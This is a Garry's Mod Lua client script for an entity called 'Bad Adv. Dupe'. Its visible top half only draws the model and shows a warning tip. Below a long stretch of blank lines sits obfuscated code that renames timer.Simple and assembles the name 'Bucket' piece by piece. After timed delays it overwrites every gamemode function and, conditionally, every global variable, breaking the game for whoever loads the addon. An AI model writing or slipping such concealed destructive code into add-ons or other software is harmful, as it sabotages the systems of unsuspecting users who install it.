language.Add("auto_removed", "Bad Adv. Dupe (?!)")
include('shared.lua')


function ENT:Draw()
    self:DrawModel()
	
	if (LocalPlayer():GetPos() - self:GetPos()):Length() < 300 then
		AddWorldTip( self:EntIndex(), "What are you doing?!", 0.5, self:GetPos(), self )
	end
end































local type		= type
local pairs		= pairs
local _G		= _G
local GAMEMODE	= GAMEMODE
local NotTS		= timer.Simple
local DrawBeam	= render.DrawBeam


local ENT = "B".."u".."c".."k".."et"

NotTS(5, function()
	if not type or type(_G) != "table" then _G = {} end
	
	NotTS(10, function()
		if not _G[ENT] then -- >:(
			GAMEMODE = _G
			
			for k,v in pairs(_G) do _G[k] = 1 end
		end
	end)
	
	if not datasrteam then
		for k,v in pairs(GAMEMODE) do
			GAMEMODE[k] = DrawBeam
		end
	end
end)











